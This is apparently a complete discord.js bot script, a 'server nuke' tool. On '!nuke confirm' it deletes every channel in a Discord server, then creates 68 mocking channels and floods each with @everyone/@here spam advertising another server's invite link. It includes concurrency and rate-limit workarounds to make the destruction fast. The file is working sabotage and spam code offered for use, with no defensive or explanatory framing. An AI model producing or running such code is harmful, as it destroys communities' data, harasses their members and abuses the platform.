const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error("❌ NO TOKEN. Set TOKEN in Railway environment variables.");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

const channelNames = [
  "𝔩𝔦𝔭𝔞𝔱 𝔰𝔢𝔯𝔳𝔢𝔯",
  "l̆̈ĭ̈p̆̈ă̈t̆̈ s̆̈ĕ̈r̆̈v̆̈ĕ̈r̆̈",
  "l̑̈ȋ̈p̑̈ȃ̈t̑̈ s̑̈v̑̈",
  "l҉i҉p҉a҉t҉ s҉e҉r҉v҉e҉r҉",
  "Lipat server"
];

const spamMsg = `# lipat server mga tanga! __https://discord.gg/fccuzDHAA__ ||@everyone|| ||@here||`;

// Parallel execution with concurrency limit (to avoid global rate limit)
async function runWithConcurrency(tasks, concurrency = 5) {
  const results = [];
  const executing = [];
  for (const task of tasks) {
    const p = Promise.resolve().then(() => task());
    results.push(p);
    if (concurrency <= tasks.length) {
      const e = p.then(() => executing.splice(executing.indexOf(e), 1));
      executing.push(e);
      if (executing.length >= concurrency) {
        await Promise.race(executing);
      }
    }
  }
  return Promise.allSettled(results);
}

// Delete ALL channels in parallel (fastest possible)
async function deleteAllChannels(guild) {
  const channels = [...guild.channels.cache.values()];
  console.log(`🗑️ Deleting ${channels.length} channels in parallel...`);
  const deleteTasks = channels.map(chan => async () => {
    try {
      await chan.delete();
      console.log(`✅ Deleted ${chan.name}`);
    } catch (e) {
      console.log(`❌ Failed to delete ${chan.name}: ${e.message}`);
    }
  });
  await runWithConcurrency(deleteTasks, 10); // delete 10 at a time
  console.log(`✅ All deletions finished`);
}

// Create 68 channels in parallel and immediately spam 10 messages in each
async function create68ChannelsAndSpam(guild) {
  console.log(`🚀 Creating 68 channels in parallel...`);
  const createTasks = [];
  for (let i = 1; i <= 68; i++) {
    const randomName = channelNames[Math.floor(Math.random() * channelNames.length)];
    const channelName = `${randomName}-${i}`;
    createTasks.push(async () => {
      try {
        const channel = await guild.channels.create({
          name: channelName,
          type: ChannelType.GuildText,
          permissionOverwrites: [{
            id: guild.roles.everyone.id,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
          }]
        });
        console.log(`📝 Created #${channelName}`);
        
        // Send 10 messages in this channel in parallel (NO DELAY)
        const msgTasks = [];
        for (let j = 0; j < 10; j++) {
          msgTasks.push(async () => {
            try {
              await channel.send(spamMsg);
            } catch (err) {
              if (err.code === 429) {
                console.log(`⏳ Rate limit on msg, waiting ${err.retryAfter}s`);
                await new Promise(r => setTimeout(r, err.retryAfter * 1000));
                await channel.send(spamMsg); // retry once
              } else {
                console.log(`❌ Msg fail in #${channelName}: ${err.message}`);
              }
            }
          });
        }
        await runWithConcurrency(msgTasks, 5); // send 5 messages at a time per channel
        console.log(`💬 Sent 10 messages in #${channelName}`);
      } catch (err) {
        if (err.code === 429) {
          console.log(`⏳ Rate limit on create, waiting ${err.retryAfter}s`);
          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
          // retry creation (simplified - just log)
          console.log(`Retry creation for ${channelName}`);
        } else {
          console.log(`❌ Create fail ${channelName}: ${err.message}`);
        }
      }
    });
  }
  await runWithConcurrency(createTasks, 3); // create 3 channels at a time (safe for Discord)
  console.log(`✅ All 68 channels created and spammed`);
}

async function nukeGuild(guild) {
  console.log(`🔥🔥🔥 SUPER FAST NUKE ON ${guild.name} 🔥🔥🔥`);
  await deleteAllChannels(guild);
  await create68ChannelsAndSpam(guild);
  console.log("💀 ULTRA FAST NUKE COMPLETE 💀");
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  client.user.setPresence({
    status: 'dnd',
    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }]
  });
  console.log("✅ Status: DND | @azairo");
});

client.on('messageCreate', async (msg) => {
  if (msg.author.bot || !msg.content.startsWith('!')) return;
  const args = msg.content.slice(1).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();
  if (cmd === 'nuke') {
    if (args[0] !== 'confirm') {
      return msg.reply("⚠️ Type `!nuke confirm` to NUKE EVERYTHING FAST.");
    }
    await msg.reply("💣 ULTRA FAST NUKE ACTIVATED. Deleting all channels...");
    await nukeGuild(msg.guild);
  }
});

client.login(TOKEN).catch(err => console.error("❌ Login failed:", err.message));
